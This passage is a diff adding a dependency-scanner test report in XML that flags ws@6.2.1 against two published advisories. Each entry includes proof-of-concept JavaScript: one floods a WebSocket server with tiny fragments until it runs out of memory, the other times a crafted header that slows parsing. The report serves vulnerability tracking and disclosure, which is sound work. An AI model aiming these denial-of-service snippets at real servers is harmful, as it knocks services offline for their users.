+[`maxHeaderSize`]: https://nodejs.org/api/http.html#httpcreateserveroptions-requestlistener
+[`server.maxHeadersCount`]: https://nodejs.org/api/http.html#servermaxheaderscount</system-out>
+            <system-err>location: /src/src/main/resources/static/vendors/jquery-mask/package-lock.json?ws, project-references: [ package-lock.json: transitive ]</system-err>
+        </testcase>
+            <testcase classname="GHSA-96hv-2xvq-fx4p" name="pkg:npm/ws@6.2.1">
+                <failure message="cvssV3: HIGH, score: 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)"/>
+            <system-out>### Impact
+
+A high volume of exceptionally small fragments and data chunks can be sent by a peer, with modest network traffic, to force the remote peer into allocating and holding structural wrappers that consume far more memory than the default documented message-size limit, leading to process termination due to OOM.
+
+### Proof of concept
+
+```js
+import { WebSocket, WebSocketServer } from &apos;ws&apos;;
+
+const wss = new WebSocketServer({ port: 0 }, function () {
+  const data = Buffer.alloc(1);
+  const options = { fin: false };
+  const { port } = wss.address();
+  const ws = new WebSocket(`ws://localhost:${port}`);
+
+  ws.on(&apos;open&apos;, function () {
+    (function send() {
+      ws.send(data, options, function (err) {
+        if (err) return;
+        send();
+      });
+    })();
+  });
+
+  ws.on(&apos;error&apos;, console.error);
+  ws.on(&apos;close&apos;, function (code, reason) {
+    console.log(`client close - code: ${code} reason: ${reason.toString()}`);
+  });
+});
+
+wss.on(&apos;connection&apos;, function (ws) {
+  ws.on(&apos;error&apos;, console.error);
+  ws.on(&apos;close&apos;, function (code, reason) {
+    console.log(`server close - code: ${code} reason: ${reason.toString()}`);
+  });
+});
+```
+
+### Patches
+
+The vulnerability was fixed in ws@8.21.0 (https://github.com/websockets/ws/commit/bca91adf15677e47dbe4f959653452727be28b94) and backported to ws@7.5.11 (https://github.com/websockets/ws/commit/fd36cd864fcdf62a08273a99e19a7d975401fee8), ws@6.2.4 (https://github.com/websockets/ws/commit/86d3e8a5fb0246ed373860c5fbb0de88824a27f7), and ws@5.2.5 (https://github.com/websockets/ws/commit/b5372ac67bb97a773727b8e9f5035a8123556d53).
+
+### Workarounds
+
+In vulnerable versions, the issue can be mitigated by lowering the value of the `maxPayload` option if possible.
+
+### Credits
+
+The vulnerability was responsibly disclosed and fixed by [Nadav Magier](https://github.com/Nadav0077).</system-out>
+            <system-err>location: /src/src/main/resources/static/vendors/jquery-mask/package-lock.json?ws, project-references: [ package-lock.json: transitive ]</system-err>
+        </testcase>
+            <testcase classname="GHSA-6fc8-4gx4-v693" name="pkg:npm/ws@6.2.1">
+                <failure message="cvssV3: MEDIUM, score: 5.300000190734863 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L)"/>
+            <system-out>### Impact
+
+A specially crafted value of the `Sec-Websocket-Protocol` header can be used to significantly slow down a ws server.
+
+### Proof of concept
+
+```js
+for (const length of [1000, 2000, 4000, 8000, 16000, 32000]) {
+  const value = &apos;b&apos; + &apos; &apos;.repeat(length) + &apos;x&apos;;
+  const start = process.hrtime.bigint();
+
+  value.trim().split(/ *, */);
+
+  const end = process.hrtime.bigint();
+
+  console.log(&apos;length = %d, time = %f ns&apos;, length, end - start);
+}
+```
+
+### Patches
+
+The vulnerability was fixed in ws@7.4.6 (https://github.com/websockets/ws/commit/00c425ec77993773d823f018f64a5c44e17023ff) and backported to ws@6.2.2 (https://github.com/websockets/ws/commit/78c676d2a1acefbc05292e9f7ea0a9457704bf1b) and ws@5.2.3 (https://github.com/websockets/ws/commit/76d47c1479002022a3e4357b3c9f0e23a68d4cd2).
+
+### Workarounds
+
+In vulnerable versions of ws, the issue can be mitigated by reducing the maximum allowed length of the request headers using the [`--max-http-header-size=size`](https://nodejs.org/api/cli.html#cli_max_http_header_size_size) and/or the [`maxHeaderSize`](https://nodejs.org/api/http.html#http_http_createserver_options_requestlistener) options.
+
+### Credits
+
+The vulnerability was responsibly disclosed along with a fix in private by [Robert McLaughlin](https://github.com/robmcl4) from University of California, Santa Barbara.
+</system-out>
+            <system-err>location: /src/src/main/resources/static/vendors/jquery-mask/package-lock.json?ws, project-references: [ package-lock.json: transitive ]</system-err>
+        </testcase>
+    </testsuite>
+        <testsuite failures="0" errors="0" time="0" id="61" name="/src/src/main/resources/static/vendors/jquery-mask/test/zepto/zepto.min.js" package="zepto.min.js" skipped="0" tests="1" timestamp="2026-11-11T14:44:50.831625211">
+            <testcase classname="dependency-check" name="zepto.min.js"/>
+    </testsuite>
+</testsuites>
